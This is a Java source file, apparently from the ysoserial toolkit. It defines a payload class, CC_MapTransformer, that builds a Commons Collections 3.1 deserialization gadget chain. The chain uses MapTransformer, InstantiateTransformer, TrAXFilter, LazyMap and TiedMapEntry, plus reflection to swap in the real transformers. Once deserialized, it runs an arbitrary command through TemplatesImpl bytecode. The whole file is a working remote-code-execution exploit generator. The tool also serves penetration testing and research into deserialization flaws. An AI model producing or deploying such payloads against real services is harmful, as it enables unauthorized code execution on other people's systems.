package ysoserial.payloads;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.MATTHIASKAISER })
public class CC_MapTransformer extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);
        Map hashmap = new HashMap();
        hashmap.put("keykey", TrAXFilter.class);
        Transformer maptransformer = MapTransformer.getInstance(hashmap);

        Transformer[] fakeTransformer = new Transformer[] {};

        Transformer[] transformers = new Transformer[]{
            maptransformer,
            new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates}
            )
        };
        ChainedTransformer chainedTransformer = new
            ChainedTransformer(fakeTransformer);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "valuevalue");
        outerMap.remove("keykey");

        Reflections.setFieldValue(chainedTransformer,"iTransformers", transformers);

        return expMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CC_MapTransformer.class, args);
    }
}
